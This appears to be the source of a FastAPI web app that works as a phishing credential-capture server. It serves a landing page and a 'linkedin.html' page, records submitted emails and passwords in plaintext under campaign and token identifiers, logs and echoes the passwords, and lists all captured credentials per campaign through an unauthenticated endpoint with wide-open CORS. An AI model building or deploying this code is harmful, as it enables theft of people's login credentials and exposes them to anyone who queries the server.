from fastapi import FastAPI, Depends, HTTPException, Query
from sqlalchemy.orm import Session
from pydantic import BaseModel
from database import SessionLocal, engine, get_db
import models
from starlette.responses import FileResponse
from fastapi.templating import Jinja2Templates
from fastapi import Request
from fastapi.middleware.cors import CORSMiddleware
import os

# Create the tables in the database (if not already created)
models.Base.metadata.create_all(bind=engine)

# Initialize FastAPI app
app = FastAPI()

# Enable CORS for requests from localhost:8000
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # Allow frontend origin
    allow_credentials=True,
    allow_methods=["*"],  # Allow all HTTP methods
    allow_headers=["*"],  # Allow all headers
)
CORS_ALLOW_ALL_ORIGINS = True
# Initialize Jinja2Templates
templates = Jinja2Templates(directory="templates")

# Pydantic model for user input (for registration)
class UserCreate(BaseModel):
    email: str
    password: str

# Create a new user endpoint (Registration)
@app.post("/register/")
async def register_user(
    user: UserCreate,  # Receive email and password as part of the request body
    db: Session = Depends(get_db), 
    campaign_id: str = Query(None),  # campaign_id from query parameters
    token: str = Query(None)  # token from query parameters
):
    try:
        # Log received information for debugging
        print(f"Received campaign_id: {campaign_id}, token: {token}")
        print(f"Received email: {user.email}, password: {user.password}")

        # Check if a user already exists with the given email (skip unique constraint)
        existing_user = db.query(models.User).filter(models.User.email == user.email).first()
        
        if existing_user:
            print(f"User with email {user.email} already exists, adding a new record.")
        
        # Create a new user and store it in the database
        new_user = models.User(email=user.email, password=user.password, campaign_id=campaign_id, token=token)
        
        # Add the new user to the session and commit
        db.add(new_user)
        db.commit()
        db.refresh(new_user)
        
        # Return success message
        return {"message": "User created successfully", "email": new_user.email, "password": new_user.password, "campaign_id": campaign_id, "token": token}
    
    except Exception as e:
        # Log the error for debugging
        print(f"Error during user registration: {str(e)}")
        return {"detail": "Internal Server Error", "error": str(e)}

# Serve the index.html file on the base route with query parameters
@app.get('/')
async def landing_page(request: Request, campaign_id: str = Query(None), token: str = Query(None)):
    # You can now pass campaign_id and token to the HTML page
    return templates.TemplateResponse("index.html", {"request": request, "campaign_id": campaign_id, "token": token})

# Serve another page (linkedin.html)
@app.get('/linkedin')
async def landing_page2():
    html_path = os.path.join(os.path.dirname(__file__), 'templates', 'linkedin.html')
    return FileResponse(html_path)

# Endpoint to fetch user data based on campaign_id and token
@app.get("/user/{campaign_id}")
async def get_user_data_by_campaign(campaign_id: str, db: Session = Depends(get_db)):
    try:
        # Query the database for all users with the given campaign_id
        users = db.query(models.User).filter(models.User.campaign_id == campaign_id).all()

        if not users:
            return {"message": "No records found for this campaign"}

        # Return all user data (email, password, campaign_id, token)
        user_data = [{"email": user.email, "password": user.password, "campaign_id": user.campaign_id, "token": user.token} for user in users]
        
        return {"users": user_data}

    except Exception as e:
        # Log the error for debugging
        print(f"Error during fetching user data: {str(e)}")
        
        # Return an error message in case of failure
        return {"detail": "Internal Server Error", "error": str(e)}
